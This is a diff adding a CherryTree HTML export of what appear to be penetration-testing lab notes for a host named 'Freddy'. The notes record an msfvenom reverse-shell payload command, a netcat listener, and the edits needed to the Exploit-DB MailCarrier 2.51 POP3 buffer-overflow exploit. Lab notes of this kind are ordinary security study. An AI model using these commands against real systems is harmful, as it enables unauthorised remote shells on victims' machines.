@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10.1.1.65 Freddy</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10.1.1.65 Freddy</h1><br/>msfvenom -p windows/shell_reverse_tcp lport=8000 lhost=10.1.1.246 -b &#39;\x00\xd9&#39; -f python<br /><br />47554.py		<br />Win10 MailCarrier 2.51 - &#39;POP3 User&#39; Remote Buffer Overflow<br />HAD to <br />	use windows/shell_reverse_tcp<br />	Change buffer length (due to the source ip address length)<br />	change target IP<br />	change target port (2110)<br />	<br />	<br />On sean: nc -nlvp 8000 (also kick off exploit from sean)<br />	<br />	<br /><a href="https://www.exploit-db.com/exploits/47554">https://www.exploit-db.com/exploits/47554</a></div></body></html>
